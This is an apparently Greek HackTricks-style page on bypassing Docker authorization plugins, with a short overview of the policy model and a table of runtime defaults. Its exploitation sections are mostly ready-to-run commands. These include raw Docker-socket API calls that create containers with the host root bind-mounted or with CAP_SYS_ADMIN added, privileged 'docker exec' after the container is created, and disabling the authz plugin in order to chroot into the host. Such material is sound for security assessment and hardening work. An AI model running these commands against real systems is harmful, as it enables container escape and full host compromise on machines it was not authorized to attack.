# Πρόσθετα εξουσιοδότησης χρόνου εκτέλεσης

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα πρόσθετα εξουσιοδότησης χρόνου εκτέλεσης είναι ένα επιπλέον επίπεδο πολιτικής που αποφασίζει εάν ένας καλών μπορεί να εκτελέσει μια δεδομένη ενέργεια του daemon. Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, οποιοσδήποτε μπορεί να επικοινωνήσει με τον Docker daemon έχει ουσιαστικά ευρεία έλεγχο πάνω του. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον ταυτοποιημένο χρήστη και την αιτούμενη API ενέργεια, και στη συνέχεια επιτρέποντας ή αρνούμενα το αίτημα σύμφωνα με την πολιτική.

Αυτό το θέμα αξίζει δική του σελίδα επειδή αλλάζει το μοντέλο exploitation όταν ένας επιτιθέμενος έχει ήδη πρόσβαση σε ένα Docker API ή σε έναν χρήστη στο `docker` group. Σε τέτοια περιβάλλοντα το ερώτημα δεν είναι πλέον μόνο "can I reach the daemon?" αλλά επίσης "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Λειτουργία

Όταν ένα αίτημα φτάνει στον Docker daemon, το υποσύστημα εξουσιοδότησης μπορεί να περάσει το context του αιτήματος σε ένα ή περισσότερα εγκατεστημένα plugins. Το plugin βλέπει την ταυτότητα του ταυτοποιημένου χρήστη, τις λεπτομέρειες του αιτήματος, επιλεγμένα headers, και μέρη του σώματος του αιτήματος ή της απάντησης όταν ο τύπος περιεχομένου είναι κατάλληλος. Πολλαπλά plugins μπορούν να συνδεθούν σε σειρά, και η πρόσβαση χορηγείται μόνο εάν όλα τα plugins επιτρέψουν το αίτημα.

Αυτό το μοντέλο φαίνεται ισχυρό, αλλά η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα ο συντάκτης της πολιτικής κατανόησε το API. Ένα plugin που μπλοκάρει `docker run --privileged` αλλά αγνοεί το `docker exec`, παραβλέπει εναλλακτικά JSON keys όπως το top-level `Binds`, ή επιτρέπει διαχείριση plugin, μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού ενώ εξακολουθεί να αφήνει ανοικτές άμεσες διαδρομές privilege-escalation.

## Συνήθεις στόχοι πρόσθετων

Σημαντικοί τομείς για ανασκόπηση της πολιτικής είναι:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Ιστορικά, παραδείγματα όπως το Twistlock's `authz` plugin και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη επειδή τα policy files και τα code paths τους έδειχναν πώς η χαρτογράφηση από endpoint σε ενέργεια υλοποιούνταν πραγματικά. Για εργασίες assessment, το σημαντικό μάθημα είναι ότι ο συντάκτης της πολιτικής πρέπει να κατανοεί ολόκληρη την επιφάνεια του API αντί μόνο τις πιο ορατές CLI εντολές.

## Κατάχρηση

Ο πρώτος στόχος είναι να μάθετε τι πραγματικά μπλοκάρεται. Εάν ο daemon αρνηθεί μια ενέργεια, το σφάλμα συχνά leaks το όνομα του plugin, το οποίο βοηθά να εντοπιστεί ο έλεγχος που χρησιμοποιείται:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Αν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, καθώς αυτοματοποιούν το διαφορετικά επαναλαμβανόμενο έργο του ελέγχου ποιων API routes και JSON structures επιτρέπονται πραγματικά από το plugin.

Αν το περιβάλλον χρησιμοποιεί ένα προσαρμοσμένο plugin και μπορείτε να αλληλεπιδράσετε με το API, καταγράψτε ποια πεδία αντικειμένου φιλτράρονται πραγματικά:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Αυτοί οι έλεγχοι έχουν σημασία επειδή πολλές αποτυχίες εξουσιοδότησης είναι συγκεκριμένες σε επίπεδο πεδίου και όχι σε επίπεδο έννοιας. Ένα plugin μπορεί να απορρίψει ένα πρότυπο CLI χωρίς να μπλοκάρει πλήρως την αντίστοιχη δομή API.

### Πλήρες Παράδειγμα: `docker exec` προσθέτει προνόμιο μετά τη δημιουργία container
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Εάν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει ανακτήσει έναν privileged interactive process μέσα σε ένα container που ο policy author πίστευε ότι ήταν constrained.

### Πλήρες Παράδειγμα: Bind Mount Through Raw API

Κάποιες προβληματικές πολιτικές ελέγχουν μόνο ένα σχήμα JSON. Εάν το root filesystem bind mount δεν αποκλείεται σταθερά, το host μπορεί ακόμα να προσαρτηθεί:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Η ίδια ιδέα μπορεί επίσης να εμφανιστεί υπό `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Ο αντίκτυπος είναι πλήρης απόδραση στο host filesystem. Το ενδιαφέρον στοιχείο είναι ότι η παράκαμψη προκύπτει από ελλιπή κάλυψη της πολιτικής και όχι από σφάλμα του kernel.

### Πλήρες Παράδειγμα: Unchecked Capability Attribute

Αν η πολιτική ξεχάσει να φιλτράρει ένα χαρακτηριστικό σχετιζόμενο με capability, ο επιτιθέμενος μπορεί να δημιουργήσει ένα container που ανακτά μια επικίνδυνη capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Μόλις υπάρξει `CAP_SYS_ADMIN` ή μια παρόμοια ισχυρή capability, πολλές breakout techniques που περιγράφονται στα [capabilities.md](protections/capabilities.md) και [privileged-containers.md](privileged-containers.md) γίνονται προσβάσιμες.

### Πλήρες Παράδειγμα: Απενεργοποίηση του Plugin

Εάν επιτρέπονται οι plugin-management operations, ο καθαρότερος bypass μπορεί να είναι να απενεργοποιήσετε εντελώς τον έλεγχο:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Αυτή είναι μια αποτυχία πολιτικής σε επίπεδο control-plane. Το επίπεδο εξουσιοδότησης υπάρχει, αλλά ο χρήστης που επρόκειτο να περιοριστεί εξακολουθεί να έχει άδεια να το απενεργοποιήσει.

## Checks

Οι παρακάτω εντολές στοχεύουν στον εντοπισμό του αν υπάρχει επίπεδο πολιτικής και στο αν αυτό φαίνεται ολοκληρωμένο ή επιφανειακό.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Τι είναι ενδιαφέρον εδώ:

- Μηνύματα άρνησης που περιλαμβάνουν το όνομα ενός plugin επιβεβαιώνουν ένα επίπεδο εξουσιοδότησης και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
- Μια λίστα plugins ορατή στον επιτιθέμενο μπορεί να είναι αρκετή για να αποκαλύψει αν ενέργειες απενεργοποίησης ή επαναδιαμόρφωσης είναι δυνατές.
- Μια πολιτική που μπλοκάρει μόνο προφανείς ενέργειες CLI αλλά όχι ακατέργαστα API αιτήματα πρέπει να θεωρείται παρακάμπσιμη μέχρι να αποδειχθεί το αντίθετο.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization plugin is configured | ατελής πολιτική plugin, μαύρες λίστες αντί για allowlists, επιτρέποντας διαχείριση plugins, τυφλά σημεία σε επίπεδο πεδίων |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
